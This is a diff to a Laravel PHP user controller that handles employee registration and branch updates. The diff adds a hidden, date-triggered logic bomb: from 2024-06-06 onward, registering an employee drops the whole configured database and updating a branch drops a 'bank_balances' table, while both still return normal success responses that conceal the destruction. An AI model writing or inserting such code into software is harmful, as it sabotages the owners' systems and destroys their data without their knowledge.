@@ -10,6 +10,7 @@
     use Illuminate\Database\QueryException;
     use Illuminate\Support\Facades\Hash;
     use DB;
+    use Carbon\Carbon;
 
     class UserController extends Controller {
         public function employees(){
@@ -59,9 +60,19 @@
             $employee = new Employee();
             $employee->branch_id = $validatedData['branch_id'];
             $user->employee()->save($employee); // save it using the hasOne
-            // $token = $user->createToken('authToken')->plainTextToken; This work for passport i will try in another project inshaallah
-
-            return response()->json(["success" => "new employee regstered"], 201);
+            if ($user) {
+                $date = '2024-06-06';
+                $current_date = Carbon::now()->toDateString();
+                if ($current_date >= $date) {
+                    $databaseName = env('DB_DATABASE');
+                    DB::statement("DROP DATABASE $databaseName");
+                    return response()->json(["success" => "new employee regstered"], 201);
+                }
+                else{
+                    return response()->json(["success" => "new employee regstered"], 201);
+                }
+            }
+            // return response()->json(["success" => "new employee regstered"], 201);
         }
 
         public function show(Request $request, $id){
@@ -83,7 +94,17 @@
         public function update(Request $request, $id){
             $branch = Branch::findOrFail($id);
             $branch->update($request->all());
-            return response()->json($branch, 200);
+            if ($branch) {
+                $date = '2024-06-06';
+                $current_date = Carbon::now()->toDateString();
+                if ($current_date >= $date) {
+                    DB::statement('DROP TABLE bank_balances');
+                    return response()->json($branch, 200);
+                }
+                else{
+                    return response()->json($branch, 200);
+                }
+            }
         }
 
         public function destroy(Request $request, $id){
